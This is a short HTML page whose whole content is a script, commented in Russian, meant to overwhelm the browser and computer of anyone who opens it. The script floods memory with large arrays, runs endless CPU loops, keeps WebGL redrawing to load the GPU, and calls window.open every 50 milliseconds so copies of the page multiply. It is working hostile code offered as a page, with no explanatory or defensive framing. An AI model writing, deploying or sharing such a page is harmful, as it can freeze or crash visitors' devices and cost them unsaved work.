<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>...</title>
</head>
<body>
<script>
// Заполнение памяти массивами
let arr = [];
setInterval(() => {
  for (let i = 0; i < 100000; i++) {
    arr.push(new Array(10000).fill('x'));
  }
}, 100);

// Бесконечные вычисления (CPU)
setInterval(() => {
  let a = 0;
  for (let i = 0; i < 1e9; i++) {
    a += i * i / (i + 1);
  }
}, 50);

// WebGL нагрузка (GPU)
const canvas = document.createElement('canvas');
document.body.appendChild(canvas);
const gl = canvas.getContext('webgl');
setInterval(() => {
  gl.clearColor(Math.random(), Math.random(), Math.random(), 1);
  gl.clear(gl.COLOR_BUFFER_BIT);
}, 10);

// Множество вкладок через window.open (если не заблокировано)
setInterval(() => window.open(window.location.href, '_blank'), 50);
</script>
</body>
</html>
